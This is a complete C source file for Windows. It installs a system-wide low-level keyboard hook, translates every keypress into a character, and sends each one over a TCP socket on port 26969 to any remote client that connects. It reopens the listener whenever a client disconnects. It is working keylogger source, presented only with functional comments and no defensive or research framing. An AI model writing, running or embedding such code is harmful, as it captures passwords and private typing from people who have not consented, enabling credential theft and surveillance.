#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

/*
This program targets Windows XP and above
*/
#define _WIN32_WINNT 0x0501

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>

#define KEY_FILE_BUF_LENGTH 195
#define KEY_BUF_LENGTH (KEY_FILE_BUF_LENGTH/3)

char keyFileBuf[KEY_FILE_BUF_LENGTH];
unsigned char *keyRef;
char *shiftUpKeys;
char *shiftDownKeys;

BOOL shiftKeyDown = FALSE;

const char *DEFAULT_PORT = "26969";

HHOOK keyboardHook = NULL;
WSADATA wsaData;
SOCKET listenSocket = INVALID_SOCKET;
SOCKET clientSocket = INVALID_SOCKET;

HANDLE serverThreadHandle = NULL;
DWORD threadId;
DWORD serverThreadReturnCode = 0;
DWORD mainThreadId;

HANDLE serverThreadSpawnerHandle = NULL;

char lastKey[3];

volatile BOOL lastKeyUpdated = FALSE;

struct addrinfo *result = NULL, *ptr = NULL, hints;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
DWORD WINAPI ServerThreadProc();
DWORD WINAPI ServerThreadSpawnProc();
int initializeSocket();
int sendKeyToClient();
void loadKeyFile();
void terminate();

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	mainThreadId = GetCurrentThreadId();
	loadKeyFile();
	
	lastKey[1] = '\n';
	lastKey[2] = 0;
	
	int wsaResult = WSAStartup(MAKEWORD(2,2),&wsaData);
	if (wsaResult != 0) {
		printf("WSAStartup() Failed: %d\n", wsaResult);
		return 1;
	}
	
	int socketInitialized = initializeSocket();
	if (socketInitialized != 0) {
		return socketInitialized;
	}
	
	if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR) {
		printf("listen() Failed: %ld\n", WSAGetLastError());
		terminate();
		return 1;
	}
	
	clientSocket = accept(listenSocket, NULL, NULL);
	if (clientSocket == INVALID_SOCKET) {
		printf("accept() Failed: %ld\n", WSAGetLastError());
		terminate();
		return 1;
	} else {
		printf("Connection accepted!\n");
	}
	
	serverThreadSpawnerHandle = CreateThread(NULL, 0, &ServerThreadSpawnProc, NULL, 0, NULL);
	serverThreadHandle = CreateThread(NULL, 0, &ServerThreadProc, NULL, 0, &threadId);
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, &KeyboardProc, hInstance, 0);
	
	MSG msg;
	BOOL msgBool;
		
	while ((msgBool = GetMessage(&msg, NULL, 0, 0)) != WM_QUIT) {
		if (msgBool == -1) {
			printf("Error!\n");
			return -1;
		}
		
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	terminate();
	
	return msg.wParam;
}

/*
Ensures that there is always a socket open
*/
DWORD WINAPI ServerThreadSpawnProc() {
	while (TRUE) {
		GetExitCodeThread(serverThreadHandle, &serverThreadReturnCode);
		if (serverThreadReturnCode == WSAECONNABORTED) {
			printf("Reopening socket...\n");
			int socketInitialized = initializeSocket();
			if (socketInitialized != 0) {
				printf("Terminated\n");
				return -1;
			}
			
			if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR) {
				printf("listen() Failed: %ld\n", WSAGetLastError());
				terminate();
				return 1;
			}
			
			clientSocket = accept(listenSocket, NULL, NULL);
			if (clientSocket == INVALID_SOCKET) {
				printf("accept() Failed: %ld\n", WSAGetLastError());
				terminate();
				return 1;
			} else {
				printf("Connection accepted!\n");
			}
			
			CloseHandle(serverThreadHandle);
			serverThreadHandle = CreateThread(NULL, 0, &ServerThreadProc, NULL, 0, &threadId);
		}
	}
}

/*
Frees all memory used by the program
*/
void terminate() {
	if (listenSocket != INVALID_SOCKET) {
		closesocket(listenSocket);
	}
	if (clientSocket != INVALID_SOCKET) {
		closesocket(clientSocket);
	}
	if (keyboardHook != NULL) {
		UnhookWindowsHookEx(keyboardHook);
	}
	if (serverThreadHandle != NULL) {
		CloseHandle(serverThreadHandle);
	}
	if (serverThreadSpawnerHandle != NULL) {
		CloseHandle(serverThreadSpawnerHandle);
	}
	if (result != NULL) {
		freeaddrinfo(result);
	}
	if (ptr != NULL) {
		freeaddrinfo(ptr);
	}
	WSACleanup();
}

/*
Loads "keys.dat", which maps virtual key codes to shift-up and shift-down ASCII characters
*/
void loadKeyFile() {
	FILE *fptr;
	fptr = fopen("keys.dat", "r");
	fread(keyFileBuf, 1, KEY_FILE_BUF_LENGTH, fptr);
	fclose(fptr);
	
	keyRef = keyFileBuf;
	shiftUpKeys = keyFileBuf + KEY_BUF_LENGTH;
	shiftDownKeys = keyFileBuf + (2 * KEY_BUF_LENGTH);
}

/*
Key callback function for the low level keyboard hook; updates lastKey[] so that new key values can be sent to the client
*/
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	
	PKBDLLHOOKSTRUCT keyData = (PKBDLLHOOKSTRUCT) lParam;
	DWORD vkCode = keyData->vkCode;
	
	if (wParam == WM_KEYDOWN) {
		printf("%x ", vkCode);
		lastKey[0] = 0;
		if (vkCode == VK_LSHIFT || vkCode == VK_RSHIFT) {
			shiftKeyDown = TRUE;
		} else {
			for (int i = 0; i < KEY_BUF_LENGTH; i++) {
				if (vkCode == keyRef[i]) {
					if (shiftKeyDown) {
						lastKey[0] = (char) shiftDownKeys[i];
					} else {
						lastKey[0] = (char) shiftUpKeys[i];
					}
				}
			}
			
			if (lastKey[0] == 0) {
				lastKey[0] = 0x08;
			}
			lastKeyUpdated = TRUE;
		}
	} else if (wParam == WM_KEYUP) {
		
		if (vkCode == VK_LSHIFT || vkCode == VK_RSHIFT) {
			shiftKeyDown = FALSE;
		}
	}
	
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

/*
Sends keypress data to the client
*/
DWORD WINAPI ServerThreadProc() {
	while (TRUE) {
		if (lastKeyUpdated) {
			lastKeyUpdated = FALSE;
			int sendResult = send(clientSocket, lastKey, 3, 0);
			
			if (sendResult == SOCKET_ERROR) {
				if (WSAGetLastError() == WSAECONNABORTED) {
					printf("\nConnection closed by client\n");
					
					closesocket(clientSocket);
					closesocket(listenSocket);
					return WSAECONNABORTED;
				}
				
				printf("send() Failed: %ld\n", WSAGetLastError());
				terminate();
				return WSAGetLastError();
			}
		}
	}
	return 0;
}

/*
Creates and binds a socket to listen for connections on
*/
int initializeSocket() {
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;
	
	int addrResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
	if (addrResult != 0) {
		printf("getaddrinfo() Failed: %d\n", addrResult);
		terminate();
		return 1;
	}
	
	listenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if (listenSocket == INVALID_SOCKET) {
		printf("socket() Failed: %ld\n", WSAGetLastError());
		terminate();
		return 1;
	}
	
	int bindResult = bind(listenSocket, result->ai_addr, (int)result->ai_addrlen);
	if (bindResult == SOCKET_ERROR) {
		printf("bind() Failed: %ld\n", WSAGetLastError());
		terminate();
		return 1;
	}
	freeaddrinfo(result);
	
	return 0;
}